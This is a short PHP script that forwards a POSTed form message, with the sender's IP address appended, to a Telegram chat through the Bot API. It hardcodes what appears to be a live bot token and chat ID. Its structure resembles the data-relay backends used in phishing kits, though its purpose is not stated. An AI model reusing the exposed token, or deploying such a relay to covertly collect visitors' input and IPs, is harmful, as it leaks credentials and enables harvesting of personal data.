<?php
// config.php

// Token y chat_id
$botToken = '7865473675:AAFTB6uLYenolBswn084E-V8At3BQ7hALDk';
$chatId = '8038528580';

// Solo si es un POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $mensaje = $_POST['message'] ?? '';

    // ✅ Capturar la IP del usuario
    $ip = $_SERVER['REMOTE_ADDR'];

    // Le agregás la IP al mensaje antes de enviarlo
    $mensaje .= "\n🌐 IP: <code>$ip</code>";

    // Datos para Telegram
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $mensaje,
        'parse_mode' => 'HTML'
    ];

    // Enviar
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data)
        ]
    ];

    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    if ($result === FALSE) {
        http_response_code(500);
        echo json_encode(['status' => 'error', 'message' => 'No se pudo enviar el mensaje.']);
    } else {
        echo json_encode(['status' => 'ok']);
    }
}
?>
    